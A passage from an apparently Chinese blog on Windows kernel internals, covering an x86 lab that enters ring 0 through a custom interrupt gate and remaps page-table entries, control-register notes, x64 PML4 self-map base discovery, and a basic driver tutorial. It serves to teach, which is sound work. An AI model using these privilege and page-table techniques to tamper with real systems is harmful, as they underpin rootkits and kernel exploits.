class=\"line\">\t\tpush esi</span><br><span class=\"line\">\t\tpush edi</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD* pPTE;\t\t\t<span class=\"comment\">// 保存目标线性地址的 PTE 线性地址</span></span><br><span class=\"line\">\tDWORD* pNullPTE;\t\t<span class=\"comment\">// 0 地址的 PTE 线性地址</span></span><br><span class=\"line\">\tpNullPTE = (DWORD*)<span class=\"number\">0xC0000000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x50000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x50000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x60000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x60000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\ty = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 刷新 TLB </span></span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//mov eax,cr4</span></span><br><span class=\"line\">\t__emit <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\t__emit <span class=\"number\">0x20</span>;</span><br><span class=\"line\">\t__emit <span class=\"number\">0xe0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tmov ebx,<span class=\"number\">0x80</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">not</span> ebx;</span><br><span class=\"line\">\t<span class=\"keyword\">and</span> eax,ebx;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//mov cr4,eax</span></span><br><span class=\"line\">\t__emit <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\t__emit <span class=\"number\">0x22</span>;</span><br><span class=\"line\">\t__emit <span class=\"number\">0xe0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 再次读取 0 地址位置的数据</span></span><br><span class=\"line\">\tz = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//恢复现场</span></span><br><span class=\"line\">\t\tpop edi</span><br><span class=\"line\">\t\tpop esi</span><br><span class=\"line\">\t\tpop ebx</span><br><span class=\"line\">\t\tmov esp, ebp</span><br><span class=\"line\">\t\tpop ebp</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD* p5 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x50000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD* p6 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x60000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p5 != (DWORD*)<span class=\"number\">0x50000000</span> || p6 != (DWORD*)<span class=\"number\">0x60000000</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error alloc!\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*p5 = <span class=\"number\">0x1234</span>;</span><br><span class=\"line\">\t*p6 = <span class=\"number\">0x5678</span>;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过中断门提权</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. 读 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, x);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2. 给 0 地址重新挂上物理页\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3. 重新读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4. 刷新 TLB \\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5. 再次读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n&quot;</span>, z);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行效果：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521144553724.png\" alt=\"image-20230521144553724\"></p>\n<h1 id=\"15、控制寄存器\"><a href=\"#15、控制寄存器\" class=\"headerlink\" title=\"15、控制寄存器\"></a>15、控制寄存器</h1><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521143220842.png\" alt=\"image-20230521143220842\"></p>\n<blockquote>\n<p>注意： 控制寄存器中有些位一旦置1，则代表对应功能直接启用。 有些位只有置1了，对应功能才可以被启用，具体启不启用看细化到PTE之类上面的控制位。 所以学习控制寄存器属性时需要留意。</p>\n</blockquote>\n<p><code>CR1、CR5、CR6 操作系统不用</code></p>\n<h2 id=\"Cr0（全局控制器）\"><a href=\"#Cr0（全局控制器）\" class=\"headerlink\" title=\"Cr0（全局控制器）\"></a>Cr0（全局控制器）</h2><ul>\n<li>PE</li>\n</ul>\n<p><code>Protection Enabled</code>：保护启用位，为1时是保护模式 ，为0时是实模式。 1时仅启用段保护机制。</p>\n<ul>\n<li>PG</li>\n</ul>\n<p><code>Paging</code>：页保护启用位（分页机制位），为1时代表启用分页保护机制。 为0时不启用分页保护机制（线性地址&#x3D;物理地址）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PE=0 PG=0  处理器工作在实模式下 （由于实模式无法使用，因此CPU提供了一个虚拟8086模式，也叫虚拟实模式）PE=1  PG=0  处理器工作在保护模式下，但只有段机制的保护，没有页机制的保护PE=0  PG=1  处理器工作在实模式下。 由于PE为0，所以PG位即使为1也不会开启页保护。同时会触发一个 一般保护异常（GP：General-protection exception）。PE=1 PG=1  处理器工作在保护模式下，同时开启了段机制保护与页机制保护。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>WP</li>\n</ul>\n<p><code>Write Protect</code>：写保护位，当WP为1时，超级特权用户（0环）不可以向用户层只读地址写入数据。x86下置1可直接修改所有只读数据，x64引入VT后，修改CR0操作可能会被拦截且触发蓝屏。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CPL&lt;3时，此时为特权层，用户层地址A（US=1）对应的页为只读页。当WP为0时，特权层程序可以对地址A进行写的操作。当WP为1时，特权层程序无法对地址A进行写的操作。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>MP EM ET NE NW</li>\n</ul>\n<p>与数学运算相关，不用了解。</p>\n<ul>\n<li>TS</li>\n</ul>\n<p><code>Task Switched</code>: 任务切换位。当call入任务门时，TS位置1。当从任务门中返回时，TS位置0。</p>\n<ul>\n<li>CD</li>\n</ul>\n<p><code>Cache Disable</code> ： 缓存禁用位。 当置1时，所有缓存全部禁用。相当于缓存的总开关。</p>\n<ul>\n<li>AM</li>\n</ul>\n<p><code>Alignment Mask</code>：对齐位。为1时，启用对齐检查。为0时，关闭对齐检查。</p>\n<h2 id=\"Cr1（保留）\"><a href=\"#Cr1（保留）\" class=\"headerlink\" title=\"Cr1（保留）\"></a>Cr1（保留）</h2><p>Cr1寄存器在X86架构中为保留状态，并未使用。</p>\n<h2 id=\"Cr2（缺页异常地址）\"><a href=\"#Cr2（缺页异常地址）\" class=\"headerlink\" title=\"Cr2（缺页异常地址）\"></a>Cr2（缺页异常地址）</h2><p>当程序执行发生缺页异常时（E号中断），CPU会将触发了缺页异常的线性地址写入Cr2寄存器。供异常处理函数（E号中断）使用。</p>\n<p>如 00401000:mov eax,[12345678]，若12345678地址无效，则CR2中存12345678. 若401000地址无效，则CR2存00401000.</p>\n<h2 id=\"Cr3（PDBR）\"><a href=\"#Cr3（PDBR）\" class=\"headerlink\" title=\"Cr3（PDBR）\"></a>Cr3（PDBR）</h2><p>页目录表基址。</p>\n<ul>\n<li>PCD：PageLevelCacheDisabled，缓存禁用位。 为1时，禁用页表缓存。该位仅在CR0.PG&#x3D;1且CR0.CD&#x3D;0时才有效果。</li>\n</ul>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521160606649.png\" alt=\"image-20230521160606649\"></p>\n<ul>\n<li>PWT：PageLevelWriteThrough，页直写位。 为1时，页表使用直写缓存，为0时页表使用回写缓存。</li>\n</ul>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521160642513.png\" alt=\"image-20230521160642513\"></p>\n<p>PCD和PWT不同来源的不同影响:</p>\n<p>当访问一个32位分页模式（101012）下的PDE时，PCD与PWT取自CR3寄存器。</p>\n<p>当访问一个PAE模式（29912）下的PDE时，PCD与PWT取自PDPTE相关寄存器</p>\n<p>当访问一个PTE时，PCD与PWT取自对应的PDE。</p>\n<p>当访问一个从线性地址翻译过来的物理地址时，PCD与PWT取自与PTE或PDE。</p>\n<h2 id=\"Cr4（个性化控制器）\"><a href=\"#Cr4（个性化控制器）\" class=\"headerlink\" title=\"Cr4（个性化控制器）\"></a>Cr4（个性化控制器）</h2><ul>\n<li><p>VME：<code>Virtual-8086 Mode Extensions，虚拟8086模式扩展位</code>。置1时，启用虚拟8086模式的中断和异常处理。置0时，不启用。</p>\n</li>\n<li><p>PVI：<code>Protected-mode Virtual Interrupts,虚拟8086中断位</code>。置1时，启用VIF（virtual interrupt flag）位。置0时，VIF位无效。</p>\n</li>\n<li><p>TSD：<code>Time Stamp Disable,时间戳禁用位</code>。置1时，只有特权级用户才可以执行RDTSC指令。置0时，所有用户都可以执行RDTSC指令。 该指令用于获取Tick值。</p>\n</li>\n<li><p>DE：<code>Debugging Extensions,调试扩展位</code>。置1时，调试寄存器DR4 DR5启用。置0时，DR4 DR5保留。DR4 DR5启用时作为DR6 DR7使用。</p>\n</li>\n<li><p>PSE：<code>Page Size Extensions,页尺寸扩展位</code>。置1时，PDE的PS位才有效果。置0时，PDE的PS位作废。</p>\n</li>\n<li><p>PAE：<code>Physical Address Extensions,物理地址扩展位</code>。 为1时，29912分页。为0时，101012分页。</p>\n</li>\n<li><p>MCE：<code>Machine-Check Enable,机器检查启用位</code>。置1时，会检查硬件连接。置0时，不会检查硬件连接。</p>\n</li>\n<li><p>PGE：<code>Page Global Enable,全局页启用位</code>。置1时，PDE PTE的G位才有效果。否则无效果；0时会刷新TLB。</p>\n</li>\n<li><p>PCE：<code>Performance-Monitoring Counter Enable,性能监控计数器启用位</code>。置1时，3环可以执行RDPMC指令。否则只能在特权级执行。</p>\n</li>\n<li><p>VMXE：<code>VMX-Enable,VT标志位</code>。为1时，代表处于VT模式下。为0时，未处于VT模式。特权级为-1</p>\n</li>\n<li><p>SMXE：<code>SMX-Enable,更安全模式位（Safer-mode）</code>。为1时，处于SM模式下。否则未处于。特权级为-2</p>\n</li>\n<li><p>SMEP和SMAP：<code>SuperModeExecuteProtect,特权执行保护</code>。为1时，特权级不能执行US&#x3D;1的代码。<code>SuperModeAccessProtect,特权访问保护</code>。为1时，特权级不能访问US&#x3D;1的数据。</p>\n</li>\n</ul>\n<blockquote>\n<p>在64位中，CR0.AM不再作为扩展位存在，而是控制SMEP与SMAP。当AM&#x3D;0时，SMEP和SMAP失效。</p>\n</blockquote>\n","categories":["Windows-Kernel"]},{"title":"x64页表映射","url":"/2023/05/25/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/","content":"<h1 id=\"x64页表映射\"><a href=\"#x64页表映射\" class=\"headerlink\" title=\"x64页表映射\"></a>x64页表映射</h1><p>微软设计了一种页表自映射的方式，提高了cpu工作的效率。正常情况下一个线性地址需要进行4次拆分.</p>\n<p><img src=\"/../images/Window-Kernel/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/image-20230525191034126.png\" alt=\"image-20230525191034126\"></p>\n<p>而在表映射的作用下，可实现3次拆分即可。</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>微软在PML4表中的某一项保存着表地址(实际上也是CR3)，假设这个地址在PML4+0x100的位置，那么根据下图所示：</p>\n<p><img src=\"/../images/Window-Kernel/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/image-20230525190600016.png\" alt=\"image-20230525190600016\"></p>\n<p>有这么一个关系：<code>![cr3+i*8]=cr3</code>。由于<code>一个PML4E可以管理的内存大小为512G</code>，因此0x100位置的PML4E可以管理的内存范围如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0xFFFF8000`00000000 ~ 0xFFFF807F`FFFFF000</span><br></pre></td></tr></table></figure>\n\n<p>按照 9-9-9-9-12 分页方式去拆分上述边界物理地址:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 起始地址</span><br><span class=\"line\">0x8000`00000000       </span><br><span class=\"line\">1 0000 0000                0x100</span><br><span class=\"line\">0 0000 0000                0x0</span><br><span class=\"line\">0 0000 0000                0x0</span><br><span class=\"line\">0 0000 0000                0x0</span><br><span class=\"line\">0000 0000 0000             0x0</span><br><span class=\"line\"> </span><br><span class=\"line\">// 结束地址</span><br><span class=\"line\">0x807F`FFFFF000</span><br><span class=\"line\">1 0000 0000                0x100</span><br><span class=\"line\">1 1111 1111                0x1FF</span><br><span class=\"line\">1 1111 1111                0x1FF</span><br><span class=\"line\">1 1111 1111                0x1FF</span><br><span class=\"line\">0000 0000 0000             0x0</span><br></pre></td></tr></table></figure>\n\n<p>常规查询流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 起始地址</span><br><span class=\"line\">![Cr3 + 0x100 * 8] = PDPTE</span><br><span class=\"line\">![PDPTE + 0x0 * 8] = PDE</span><br><span class=\"line\">![PDE + 0x0 * 8] = PTE</span><br><span class=\"line\">![PTE + 0x0 * 8] = 物理页面</span><br><span class=\"line\"> </span><br><span class=\"line\">// 结束地址</span><br><span class=\"line\">![Cr3 + 0x100 * 8] = PDPTE</span><br><span class=\"line\">![PDPTE + 0x1FF * 8] = PDE</span><br><span class=\"line\">![PDE + 0x1FF * 8] = PTE</span><br><span class=\"line\">![PTE + 0x0 * 8] = 物理页面</span><br></pre></td></tr></table></figure>\n\n<p>根据上述等式，![Cr3 + 0x100 * 8] &#x3D; Cr3，所以查询流程变为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 起始地址</span><br><span class=\"line\">![Cr3 + 0x0 * 8] = PDE</span><br><span class=\"line\">![PDE + 0x0 * 8] = PTE</span><br><span class=\"line\">![PTE + 0x0 * 8] = 物理页面</span><br><span class=\"line\"> </span><br><span class=\"line\">// 结束地址</span><br><span class=\"line\">![Cr3 + 0x1FF * 8] = PDE</span><br><span class=\"line\">![PDE + 0x1FF * 8] = PTE</span><br><span class=\"line\">![PTE + 0x0 * 8] = 物理页面</span><br></pre></td></tr></table></figure>\n\n<p>很神奇，<strong>查询页表操作由四次变成了三次</strong>，效率大大提升。而且只是使用了8字节的物理地址空间来保存 Cr3 。下图展示了优化后的查询过程：</p>\n<p><img src=\"/../images/Window-Kernel/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/image-20230525191009000.png\" alt=\"image-20230525191009000\"></p>\n<h2 id=\"推导PML4基地址\"><a href=\"#推导PML4基地址\" class=\"headerlink\" title=\"推导PML4基地址\"></a>推导PML4基地址</h2><p>PML4 页表基址有两个特点：</p>\n<ul>\n<li>属于虚拟地址</li>\n<li>虚拟地址的内容是Cr3</li>\n</ul>\n<p><code>cr3=[pml4_base]</code></p>\n<p>物理寻址如下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//!为读物理地址</span><br><span class=\"line\">cr3\t=![x + pte]</span><br><span class=\"line\">\t=![x + ![y + pde]]</span><br><span class=\"line\">\t=![x + ![y + ![z + pdpte]]]</span><br><span class=\"line\">\t=![x + ![y + ![z + ![r + pml4]]]]</span><br><span class=\"line\">\t=![x + ![y + ![z + ![r + ![n + cr3]]]]]</span><br></pre></td></tr></table></figure>\n\n<p>其中cr3&#x3D;pml4_base</p>\n<ul>\n<li>x:page_offset,页内偏移</li>\n<li>y:pti</li>\n<li>z:pdi</li>\n<li>r:pdti</li>\n<li>n:自映射的索引。</li>\n</ul>\n<p>当x&#x3D;y&#x3D;z&#x3D;r&#x3D;0时,可得:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cr3 = ![![![n + cr3]]]</span><br></pre></td></tr></table></figure>\n<p>由此可知在cr3中的<code>某项保存的物理地址指向了自身</code>,因此可以将cr3映射到虚拟地址后，通过遍历来获取自身。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">VOID <span class=\"title function_\">UnloadDrv</span><span class=\"params\">(PDRIVER_OBJECT pDrv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDrv, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNTSTATUS status = STATUS_SUCCESS;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpDrv-&gt;DriverUnload = UnloadDrv;</span><br><span class=\"line\">\t\t<span class=\"comment\">//获取CR3的虚地址</span></span><br><span class=\"line\">\t\tPHYSICAL_ADDRESS pCr3 = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t\tpCr3.QuadPart = __readcr3();</span><br><span class=\"line\">\t\tPULONG64 tmp = MmGetVirtualForPhysical(pCr3);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (tmp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class=\"string\">&quot;get cr3 virtual address failed!\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class=\"string\">&quot;cr3 virtual address = %p\\r\\n&quot;</span>, tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//遍历</span></span><br><span class=\"line\">\t\tULONG_PTR pml4_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">512</span>; i++) <span class=\"comment\">//512是因为pml4表项有512个,cr3=pml4表头</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pCr3.QuadPart == (tmp[i] &amp; <span class=\"number\">0xFFFFFFFFF000</span>)) <span class=\"comment\">//去除属性</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tpml4_base = tmp[i] &amp; <span class=\"number\">0xFFFFFFFFF000</span>;</span><br><span class=\"line\">\t\t\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class=\"string\">&quot;&amp;tmp[i] = %p\\rpml4_base = %p\\r\\n&quot;</span>,&amp;tmp[i], pml4_base);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> (FALSE);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> status;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/image-20230525185152023.png\" alt=\"image-20230525185152023\"></p>\n<p>有了PML4基址，其他基址就可以推出了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">ULONG64 <span class=\"title function_\">GetPdptBase</span><span class=\"params\">(ULONG64 ulPml4Base)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (ulPml4Base &gt;&gt; <span class=\"number\">21</span>) &lt;&lt; <span class=\"number\">21</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">ULONG64 <span class=\"title function_\">GetPdBase</span><span class=\"params\">(ULONG64 ulPml4Base)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (ulPml4Base &gt;&gt; <span class=\"number\">30</span>) &lt;&lt; <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">ULONG64 <span class=\"title function_\">GetPtBase</span><span class=\"params\">(ULONG64 ulPml4Base)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (ulPml4Base &gt;&gt; <span class=\"number\">39</span>) &lt;&lt; <span class=\"number\">39</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/x64%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84/image-20230525191636201.png\" alt=\"image-20230525191636201\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>[原创]四级分页下的页表自映射与基址随机化原理介绍<a href=\"https://bbs.kanxue.com/thread-274152.htm\">https://bbs.kanxue.com/thread-274152.htm</a></p>\n<p>[关于WIndows内核自映射方案的通俗解释]]<a href=\"https://www.cnblogs.com/SivilTaram/p/WindowsKernelMapping.html\">https://www.cnblogs.com/SivilTaram/p/WindowsKernelMapping.html</a></p>\n","categories":["Windows-Kernel"]},{"title":"x86驱动开发","url":"/2024/04/21/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/","content":"<p>WDK下载链接:<code>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk</code>,根据页面对应内容下载即可。</p>\n<blockquote>\n<p>x86驱动打开只能使用&lt;&#x3D;wdk8.1版本，对应的可用vs版本为&lt;&#x3D;vs2017。因此X86篇章的驱动开发环境如下:</p>\n</blockquote>\n<ul>\n<li>系统:window7 x64 sp1</li>\n<li>IDE：VS2013</li>\n<li>WDK：8.1</li>\n</ul>\n<hr>\n<h1 id=\"一、DriverEntry\"><a href=\"#一、DriverEntry\" class=\"headerlink\" title=\"一、DriverEntry\"></a>一、DriverEntry</h1><h2 id=\"1、第一个驱动\"><a href=\"#1、第一个驱动\" class=\"headerlink\" title=\"1、第一个驱动\"></a>1、第一个驱动</h2><p>安装WDK后，VS新建项目中会多出<code>Windows Driver</code>项。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524165705048.png\" alt=\"image-20230524165705048\"></p>\n<p>KMDF和WDM的区别不大，KMDF的驱动支持即插即用设备，例如U盘。在测试中发现x86下安装KMDF会失败，这里只写使用WDM进行编写驱动。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span> <span class=\"comment\">//内核头文件</span></span></span><br><span class=\"line\"><span class=\"comment\">//卸载驱动函数</span></span><br><span class=\"line\">VOID <span class=\"title function_\">DrvUnload</span><span class=\"params\">(PDRIVER_OBJECT pDrv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDrv, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNTSTATUS status = STATUS_SUCCESS; <span class=\"comment\">//返回值,内核中STATUS_SUCCESS表示操作成功，如果返回非值则代表操作失败。</span></span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpDrv-&gt;DriverUnload = DrvUnload; <span class=\"comment\">//用于驱动卸载时调用,如果不设置则无法进行卸载</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> (FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> status;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中需要对VS设置如下：</p>\n<p>1、关闭C++<code>将警告视为错误</code>。</p>\n<p>2、关闭WppTraping<code>Run Wpp Tracing</code>。</p>\n<p>然后编译即可。在测试平台上使用<code>KmdManager</code>进行加载，首先点击<code>Register</code>，然后点击<code>Run</code>。使用PcHunter可以看到驱动已经加载。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524170812115.png\" alt=\"image-20230524170812115\"></p>\n<p>在加载驱动的时候首先需要将驱动的基本信息写入注册表中，写入的路径为DriverEntry的第二个参数。使用<code>KdPrint</code>进行输出。</p>\n<blockquote>\n<p>KdPrint和DbgPrint区别是：KdPrint实际上是一个宏，会对Debug和Release进行判断,如果为Debug编译的驱动则会调用DbgPrint，否则不调用。</p>\n</blockquote>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524171639600.png\" alt=\"image-20230524171639600\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">KdPrint((&quot;%wZ\\r\\n&quot;, pReg));</span><br></pre></td></tr></table></figure>\n\n<p><code>%wZ</code>表示的是输出内核字符串。内核中一旦出现内存溢出或者空指针则会引发蓝屏，因此微软使用了更安全的UNICODE_STRING结构来表示字符串.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">UNICODE_STRING</span> &#123;</span></span><br><span class=\"line\">    USHORT Length;\t\t\t\t<span class=\"comment\">//字符串占用字节长度,而非字符串长度</span></span><br><span class=\"line\">    USHORT MaximumLength;\t\t<span class=\"comment\">//字符串缓冲区的字节大小</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> MIDL_PASS</span></span><br><span class=\"line\">    [size_is(MaximumLength / <span class=\"number\">2</span>), length_is((Length) / <span class=\"number\">2</span>) ] USHORT * Buffer;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span> <span class=\"comment\">// MIDL_PASS</span></span></span><br><span class=\"line\">    _Field_size_bytes_part_(MaximumLength, Length) PWCH   Buffer;\t\t\t\t<span class=\"comment\">//!!!!!此处的指针指向的是字符串的指针</span></span><br><span class=\"line\"><span 